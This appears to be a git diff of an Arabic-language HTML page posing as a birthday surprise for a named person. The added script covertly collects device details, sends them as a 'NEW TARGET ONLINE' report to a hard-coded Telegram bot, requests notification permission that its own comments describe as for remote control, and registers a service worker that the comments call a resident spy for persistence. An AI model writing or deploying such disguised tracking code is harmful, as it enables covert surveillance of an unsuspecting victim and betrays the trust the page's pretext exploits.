@@ -2,49 +2,90 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Birthday for Hadil 🎂</title>
-    </head>
+    <style>
+        body { background: #000; color: #ff007f; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #startBtn { padding: 20px 50px; font-size: 1.5rem; background: transparent; border: 2px solid #ff007f; color: #ff007f; border-radius: 50px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px #ff007f; }
+        #startBtn:hover { background: #ff007f; color: #fff; }
+    </style>
+</head>
 <body>
-    <button id="startBtn" style="padding:20px; font-size:20px; cursor:pointer;">START THE SURPRISE 🎹</button>
+
+    <button id="startBtn">START THE SURPRISE 🎹</button>
 
     <script>
-        const BOT_TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
+        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
 
-        // تسجيل الـ Service Worker للخلود الرقمي
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('sw.js')
-                .then(reg => console.log('🛡️ Shadow Module Integrated.'))
-                .catch(err => console.log('❌ Installation Failed.'));
-            });
-        }
+        // 1. طلب إذن الإشعارات فور تحميل الصفحة (ضروري للتحكم عن بعد)
+        window.addEventListener('load', () => {
+            if ('Notification' in window) {
+                Notification.requestPermission();
+            }
+        });
 
         document.getElementById('startBtn').addEventListener('click', async () => {
-            document.getElementById('startBtn').style.display = 'none';
+            const btn = document.getElementById('startBtn');
+            btn.innerText = "LOADING...";
             
-            // سحب البيانات الأولية فوراً عند الضغط
-            let batt = "N/A";
-            if(navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batt = `${Math.round(b.level * 100)}%`;
-            }
+            try {
+                // 2. اهتزاز تجريبي لكسر حماية المتصفح
+                if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
 
-            const report = `💀 **TARGET ACCESSED**\nOS: ${navigator.platform}\nRAM: ${navigator.deviceMemory}GB\nBattery: ${batt}`;
-            
-            // إرسال التقرير الأول للبوت (سيحاول جلب الـ Chat ID تلقائياً)
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-            .then(r => r.json())
-            .then(data => {
-                const cid = data.result[data.result.length-1].message.chat.id;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(report)}`);
+                // 3. جلب الـ Chat ID من آخر رسالة أرسلتها أنت للبوت
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+                const data = await res.json();
                 
-                // إرسال الـ Chat ID للـ Service Worker ليبقى على اتصال
-                if (navigator.serviceWorker.controller) {
-                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: cid });
+                if (!data.result || data.result.length === 0) {
+                    alert("يرجى إرسال رسالة للبوت في تليجرام أولاً!");
+                    return;
                 }
-            });
+                
+                const chatId = data.result[data.result.length - 1].message.chat.id;
 
-            alert("المفاجأة تبدأ الآن... انتظر التحميل!");
+                // 4. جمع بيانات الجهاز (بدون صلاحيات)
+                let batteryInfo = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+                }
+
+                const report = `
+🚀 **NEW TARGET ONLINE**
+------------------------
+📱 **Hardware:**
+- OS: ${navigator.platform}
+- RAM: ${navigator.deviceMemory || 'N/A'} GB
+- Cores: ${navigator.hardwareConcurrency || 'N/A'}
+- Battery: ${batteryInfo}
+- Screen: ${window.screen.width}x${window.screen.height}
+
+⚙️ **Browser:**
+- Lang: ${navigator.language}
+- Agent: ${navigator.userAgent.slice(0, 40)}...
+------------------------`;
+
+                // 5. إرسال التقرير الأول
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+
+                // 6. تسجيل الـ Service Worker (الخلود الرقمي)
+                if ('serviceWorker' in navigator) {
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    // إرسال الـ Chat ID للجاسوس المقيم
+                    setTimeout(() => {
+                        if (navigator.serviceWorker.controller) {
+                            navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: chatId });
+                        }
+                    }, 1000);
+                }
+
+                btn.style.display = 'none';
+                alert("تم تفعيل بروتوكول الأمان.. المفاجأة تبدأ الآن!");
+
+            } catch (err) {
+                console.error(err);
+                alert("حدث خطأ في الاتصال بالسيرفر.");
+            }
         });
     </script>
 </body>
